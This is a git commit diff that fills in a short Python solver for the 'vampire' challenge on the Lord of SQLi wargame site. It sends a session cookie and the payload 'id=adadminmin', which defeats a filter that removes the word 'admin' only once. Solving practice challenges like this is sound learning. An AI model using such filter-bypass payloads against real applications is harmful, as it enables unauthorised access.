8a8a43a38948ebf15c14ff54c4b17b151d3f8527
hackintoanetwork <83481196+hackintoanetwork@users.noreply.github.com>
2022-10-23 10:15:10 +0900

    Update vampire.py

--- vampire.py
+++ vampire.py
@@ -1,7 +1,13 @@
 import requests
 
-url = ""
-cookie = {'':''}
+url = "https://los.rubiya.kr/chall/vampire_e3f1ef853da067db37f342f3a1881156.php?"
+cookie = {'PHPSESSID':'4b8kq11mkmch95tvu9qu2s8add'}
 
 def solve():
+    query = "id=adadminmin"
+    res = requests.get(url=url+query, cookies=cookie)
+    if "VAMPIRE Clear!" in res.text:
+        print("VAMPIRE Clear!")
 
+if __name__ == "__main__":
+    solve()
